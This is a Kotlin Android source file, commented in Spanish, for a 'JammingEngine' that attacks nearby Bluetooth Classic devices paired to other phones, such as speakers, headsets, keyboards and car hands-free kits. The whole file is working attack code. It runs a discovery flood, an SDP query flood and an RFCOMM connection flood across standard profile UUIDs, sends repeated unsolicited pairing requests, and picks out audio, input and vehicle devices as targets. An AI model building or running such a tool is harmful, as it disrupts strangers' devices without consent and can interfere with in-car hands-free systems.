package com.industrialble.jamming

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothSocket
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.util.Log
import java.util.Random
import java.io.IOException
import java.util.UUID
import java.util.concurrent.Callable
import java.util.concurrent.CopyOnWriteArrayList
import java.util.concurrent.Executors
import java.util.concurrent.Future
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.ThreadFactory
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong

/**
 * 🔥 INTERFERENCIA PARA BLUETOOTH CLÁSICO (BR/EDR)
 *
 * ESTRATEGIA COMPLETA para degradar conexiones Bluetooth Clásico (A2DP, HSP, HFP, etc.)
 * de dispositivos CERCANOS (parlantes, auriculares, manos libres, teclados, etc.)
 * conectados a otros teléfonos.
 *
 * CAPAS DE ATAQUE:
 * 1. Discovery Flood — inquiry continuo cada ~1.5s
 * 2. SDP Query Flood — consultas fetchUuidsWithSdp() cada ~1s
 * 3. RFCOMM Flood — intentos de conexión con UUIDs de perfiles reales
 * 4. Bonding Attack — intentos de emparejamiento cada 5s
 */
class JammingEngine(
    private val bluetoothAdapter: BluetoothAdapter,
    private val context: Context?
) {

    private val scheduler: ScheduledExecutorService = Executors.newScheduledThreadPool(
        8,
        ThreadFactory { Thread(it, "bt-classic-${threadCounter.incrementAndGet()}") }
    )

    private val rfcommExecutor = Executors.newCachedThreadPool(
        ThreadFactory { Thread(it, "rfcomm-${threadCounter.incrementAndGet()}") }
    )
    private val rfcommFutures = CopyOnWriteArrayList<Future<*>>()

    private val isActive = AtomicBoolean(false)
    private val startTime = AtomicLong(0)
    private val sdpQueriesSent = AtomicLong(0)
    private val rfcommAttempts = AtomicLong(0)
    private val bondingAttempts = AtomicLong(0)
    private val random = Random()

    private val _discoveredDevices = CopyOnWriteArrayList<String>()
    private val _deviceNames = CopyOnWriteArrayList<String>()
    val discoveredDevices: List<String> get() = _discoveredDevices.toList()

    // SDP targets
    private val sdpTargets = CopyOnWriteArrayList<String>()
    private var sdpAttackRunning = false

    // RFCOMM attack targets
    private val rfcommTargets = CopyOnWriteArrayList<String>()
    private var rfcommAttackRunning = false

    // Bonding targets
    private val bondedTargets = CopyOnWriteArrayList<String>()
    private var bondingRunning = false

    // Callbacks
    var onDeviceDiscovered: ((String, String?) -> Unit)? = null
    var onStateChanged: ((Boolean) -> Unit)? = null
    var onLog: ((String) -> Unit)? = null
    var onRfcommAttack: ((String) -> Unit)? = null

    data class JamStats(
        val isActive: Boolean,
        val sdpQueriesSent: Long,
        val rfcommConnectionAttempts: Long,
        val bondingAttempts: Long,
        val elapsedSeconds: Long,
        val devicesFound: Int
    )

    companion object {
        private const val TAG = "BtClassicJammer"
        private val threadCounter = AtomicLong(0)

        // Perfiles Bluetooth BR/EDR estándar
        val PROFILE_UUIDS = listOf(
            UUID.fromString("00001101-0000-1000-8000-00805F9B34FB"), // SPP
            UUID.fromString("00001108-0000-1000-8000-00805F9B34FB"), // HSP
            UUID.fromString("0000110B-0000-1000-8000-00805F9B34FB"), // A2DP Sink
            UUID.fromString("0000110A-0000-1000-8000-00805F9B34FB"), // A2DP Source
            UUID.fromString("0000111E-0000-1000-8000-00805F9B34FB"), // HFP
            UUID.fromString("0000110E-0000-1000-8000-00805F9B34FB"), // AVRCP
            UUID.fromString("00001105-0000-1000-8000-00805F9B34FB"), // OPP/GAVDP
            UUID.fromString("00001124-0000-1000-8000-00805F9B34FB"), // HID
            UUID.fromString("00001115-0000-1000-8000-00805F9B34FB"), // PANU
            UUID.fromString("00001130-0000-1000-8000-00805F9B34FB"), // PBAP
            UUID.fromString("00001132-0000-1000-8000-00805F9B34FB"), // MAP
            UUID.fromString("00001112-0000-1000-8000-00805F9B34FB"), // Headset AG
            UUID.fromString("00001116-0000-1000-8000-00805F9B34FB"), // BIP
            UUID.fromString("0000112F-0000-1000-8000-00805F9B34FB"), // GNSS
            UUID.fromString("00001134-0000-1000-8000-00805F9B34FB")  // GATT
        )

        val EXTRA_UUIDS = (0 until 10).map { UUID.randomUUID() }
        val ALL_TARGET_UUIDS by lazy { (PROFILE_UUIDS + EXTRA_UUIDS).toList() }
    }

    // ════════════════════════════════════════════════════════════
    // CONTROL
    // ════════════════════════════════════════════════════════════

    fun start() {
        if (isActive.getAndSet(true)) return
        sdpQueriesSent.set(0)
        rfcommAttempts.set(0)
        bondingAttempts.set(0)
        startTime.set(System.currentTimeMillis())

        log("")
        log("╔══════════════════════════════════════════════╗")
        log("║  🔥 ATAQUE BLUETOOTH CLÁSICO INICIADO       ║")
        log("╚══════════════════════════════════════════════╝")
        log("📱 Dispositivo: ${bluetoothAdapter.name ?: "Desconocido"}")
        log("📡 Bluetooth: ${if (bluetoothAdapter.isEnabled) "ACTIVO" else "APAGADO"}")
        log("🎯 ${PROFILE_UUIDS.size} perfiles BT + ${EXTRA_UUIDS.size} UUIDs extra")

        registerDiscoveryReceiver()
        startClassicDiscoveryFlood()
        log("📡 CAPA 1: Discovery Flood")

        startSdpQueryLoop()
        log("📡 CAPA 2: SDP Query Flood")

        startRfcommAttackLoop()
        log("📡 CAPA 3: RFCOMM Connection Flood")

        startBondingLoop()
        log("📡 CAPA 4: Bonding Attack")

        onStateChanged?.invoke(true)
    }

    fun stop() {
        if (!isActive.getAndSet(false)) return
        log("🛑 DETENIENDO...")

        rfcommFutures.forEach { it.cancel(true) }
        rfcommFutures.clear()
        rfcommExecutor.shutdownNow()

        scheduler.shutdown()
        try { scheduler.awaitTermination(2, TimeUnit.SECONDS) } catch (_: InterruptedException) { }

        cancelClassicDiscovery()
        unregisterDiscoveryReceiver()

        val elapsed = (System.currentTimeMillis() - startTime.get()) / 1000
        log("✅ Detenido tras ${elapsed}s")
        log("📊 SDP: ${sdpQueriesSent.get()} | RFCOMM: ${rfcommAttempts.get()} | Bonding: ${bondingAttempts.get()} | Disp: ${_discoveredDevices.size}")

        sdpAttackRunning = false
        rfcommAttackRunning = false
        bondingRunning = false
        onStateChanged?.invoke(false)
    }

    fun getStats(): JamStats = JamStats(
        isActive = isActive.get(),
        sdpQueriesSent = sdpQueriesSent.get(),
        rfcommConnectionAttempts = rfcommAttempts.get(),
        bondingAttempts = bondingAttempts.get(),
        elapsedSeconds = if (isActive.get())
            (System.currentTimeMillis() - startTime.get()) / 1000
        else 0L,
        devicesFound = _discoveredDevices.size
    )

    fun clearDevices() {
        _discoveredDevices.clear()
        _deviceNames.clear()
        sdpTargets.clear()
        rfcommTargets.clear()
        bondedTargets.clear()
    }

    fun shutdown() { stop() }

    // ════════════════════════════════════════════════════════════
    // CAPA 1: DISCOVERY FLOOD
    // ════════════════════════════════════════════════════════════

    private var isClassicDiscovering = false
    private var discoveryReceiver: BroadcastReceiver? = null

    private fun startClassicDiscoveryFlood() {
        if (!isActive.get()) return
        scheduler.schedule({
            if (!isActive.get()) return@schedule
            try {
                if (!bluetoothAdapter.isDiscovering) {
                    bluetoothAdapter.startDiscovery()
                    isClassicDiscovering = true
                }
                scheduler.schedule({
                    if (isActive.get()) {
                        cancelClassicDiscovery()
                        scheduler.schedule({
                            if (isActive.get()) startClassicDiscoveryFlood()
                        }, 300, TimeUnit.MILLISECONDS)
                    }
                }, 1200, TimeUnit.MILLISECONDS)
            } catch (e: Exception) {
                if (isActive.get()) startClassicDiscoveryFlood()
            }
        }, 0, TimeUnit.MILLISECONDS)
    }

    private fun cancelClassicDiscovery() {
        try {
            if (bluetoothAdapter.isDiscovering) bluetoothAdapter.cancelDiscovery()
        } catch (_: Exception) { }
        isClassicDiscovering = false
    }

    private fun registerDiscoveryReceiver() {
        discoveryReceiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context, intent: Intent) {
                when (intent.action) {
                    BluetoothDevice.ACTION_FOUND -> {
                        val device = intent.getParcelableExtra<BluetoothDevice>(
                            BluetoothDevice.EXTRA_DEVICE
                        ) ?: return
                        if (!_discoveredDevices.contains(device.address)) {
                            _discoveredDevices.add(device.address)
                            _deviceNames.add(device.name ?: "Desconocido")
                            onDeviceDiscovered?.invoke(device.address, device.name)
                            log("🔍 ${device.address} (${device.name ?: "?"})")

                            val name = (device.name ?: "").lowercase()
                            when {
                                name.contains("speaker") || name.contains("audio") ||
                                name.contains("headphone") || name.contains("auricular") ||
                                name.contains("parlante") || name.contains("earphone") ||
                                name.contains("headset") || name.contains("sound") ||
                                name.contains("music") || name.contains("altavoz") ||
                                name.contains("buds") || name.contains("earbuds") ->
                                    log("🎯 AUDIO: ${device.name} - ${device.address}")
                                name.contains("keyboard") || name.contains("teclado") ||
                                name.contains("mouse") || name.contains("ratón") ||
                                name.contains("key") || name.contains("hid") ->
                                    log("🖱️ HID: ${device.name} - ${device.address}")
                                name.contains("car") || name.contains("coche") ||
                                name.contains("auto") || name.contains("vehicle") ||
                                name.contains("handsfree") || name.contains("manos") ||
                                name.contains("carplay") || name.contains("android auto") ->
                                    log("🚗 MANOS LIBRES: ${device.name} - ${device.address}")
                            }
                        }
                    }
                    BluetoothAdapter.ACTION_DISCOVERY_FINISHED -> {
                        isClassicDiscovering = false
                    }
                }
            }
        }
        val filter = IntentFilter().apply {
            addAction(BluetoothDevice.ACTION_FOUND)
            addAction(BluetoothAdapter.ACTION_DISCOVERY_FINISHED)
        }
        try { context?.registerReceiver(discoveryReceiver, filter) }
        catch (e: Exception) { log("⚠️ Error registerReceiver: ${e.message}") }
    }

    private fun unregisterDiscoveryReceiver() {
        try { discoveryReceiver?.let { context?.unregisterReceiver(it) } } catch (_: Exception) { }
        discoveryReceiver = null
    }

    // ════════════════════════════════════════════════════════════
    // CAPA 2: SDP QUERY FLOOD
    // ════════════════════════════════════════════════════════════

    /**
     * Inicia el flood SDP. Llama a startSdpQueryLoop() que setea el flag
     * y luego scheduleSdpCycle() que se encarga del loop real.
     */
    private fun startSdpQueryLoop() {
        if (!isActive.get() || sdpAttackRunning) return
        sdpAttackRunning = true
        log("📋 SDP Flood: Iniciado...")
        runSdpCycle()
    }

    /**
     * Ejecuta un ciclo SDP y se reprograma.
     * NO tiene guard flags — depende de isActive para detenerse.
     */
    private fun runSdpCycle() {
        if (!isActive.get()) { sdpAttackRunning = false; return }

        val targets = _discoveredDevices.toList()
        if (targets.isNotEmpty()) {
            val targetsToQuery = targets.shuffled(random).take(4)

            targetsToQuery.forEach { address ->
                if (!isActive.get()) return
                try {
                    val device = bluetoothAdapter.getRemoteDevice(address)
                    if (device != null) {
                        device.fetchUuidsWithSdp()
                        sdpQueriesSent.incrementAndGet()
                        if (random.nextInt(3) == 0) {
                            device.fetchUuidsWithSdp()
                            sdpQueriesSent.incrementAndGet()
                        }
                    }
                } catch (_: Exception) { }
            }

            if (sdpQueriesSent.get() % 10 == 0L && sdpQueriesSent.get() > 0) {
                log("📋 SDP: ${sdpQueriesSent.get()} queries enviadas (${targetsToQuery.size} targets)")
            }
        }

        val delay = 800L + random.nextInt(700)
        scheduler.schedule({ runSdpCycle() }, delay, TimeUnit.MILLISECONDS)
    }

    // ════════════════════════════════════════════════════════════
    // CAPA 3: RFCOMM CONNECTION FLOOD
    // ════════════════════════════════════════════════════════════

    private fun startRfcommAttackLoop() {
        if (!isActive.get() || rfcommAttackRunning) return
        rfcommAttackRunning = true
        log("🔗 RFCOMM Flood: Iniciado...")
        runRfcommCycle()
    }

    private fun runRfcommCycle() {
        if (!isActive.get()) { rfcommAttackRunning = false; return }

        val targets = _discoveredDevices.toList()
        val targetsToAttack = if (targets.size > 3)
            targets.shuffled(random).take(3)
        else targets

        if (targetsToAttack.isNotEmpty()) {
            log("🔗 RFCOMM: Atacando ${targetsToAttack.size} dispositivos...")
            targetsToAttack.forEach { address ->
                if (!isActive.get()) return
                launchRfcommAttack(address)
            }
        }

        val delay = 2000L + random.nextInt(2000)
        scheduler.schedule({ runRfcommCycle() }, delay, TimeUnit.MILLISECONDS)
    }

    private fun launchRfcommAttack(address: String) {
        if (!isActive.get()) return

        val uuidsToTry = ALL_TARGET_UUIDS.shuffled(random).take(8)

        uuidsToTry.forEach { uuid ->
            if (!isActive.get()) return@forEach

            val future = rfcommExecutor.submit(Callable {
                if (!isActive.get()) return@Callable Unit
                var socket: BluetoothSocket? = null
                try {
                    val device = bluetoothAdapter.getRemoteDevice(address)
                    if (device != null) {
                        socket = device.createRfcommSocketToServiceRecord(uuid)
                        socket.connect()
                        log("⚡ CONEXIÓN RFCOMM EXITOSA con $address (UUID=$uuid)")
                        try { socket.close() } catch (_: Exception) { }
                        rfcommAttempts.incrementAndGet()
                    }
                } catch (e: IOException) {
                    rfcommAttempts.incrementAndGet()
                } catch (_: SecurityException) { }
                catch (_: Exception) { }
                finally {
                    if (socket != null) {
                        try { if (socket.isConnected) socket.close() } catch (_: Exception) { }
                    }
                }
                Unit
            })

            rfcommFutures.add(future)

            scheduler.schedule({
                if (!future.isDone) {
                    future.cancel(true)
                    rfcommFutures.remove(future)
                }
            }, 4000, TimeUnit.MILLISECONDS)
        }

        rfcommFutures.removeAll { it.isDone }
        onRfcommAttack?.invoke(address)
    }

    // ════════════════════════════════════════════════════════════
    // CAPA 4: BONDING ATTACK
    // ════════════════════════════════════════════════════════════

    private fun startBondingLoop() {
        if (!isActive.get() || bondingRunning) return
        bondingRunning = true
        log("🔐 Bonding: Iniciado...")
        runBondingCycle()
    }

    private fun runBondingCycle() {
        if (!isActive.get()) { bondingRunning = false; return }

        val targets = _discoveredDevices
            .filter { !bondedTargets.contains(it) }
            .toList()

        if (targets.isNotEmpty()) {
            val targetsToBond = targets.take(2)
            targetsToBond.forEach { address ->
                if (!isActive.get()) return
                try {
                    val device = bluetoothAdapter.getRemoteDevice(address)
                    if (device != null && device.bondState != BluetoothDevice.BOND_BONDED) {
                        val started = device.createBond()
                        if (started) {
                            bondingAttempts.incrementAndGet()
                            bondedTargets.add(address)
                            log("🔐 Bonding: intentando con $address")
                        }
                    }
                } catch (_: Exception) { }
            }
        }

        scheduler.schedule({ runBondingCycle() }, 5000, TimeUnit.MILLISECONDS)
    }

    // ════════════════════════════════════════════════════════════
    // LOGGING
    // ════════════════════════════════════════════════════════════

    private fun log(msg: String) {
        Log.i(TAG, msg)
        onLog?.invoke(msg)
    }
}
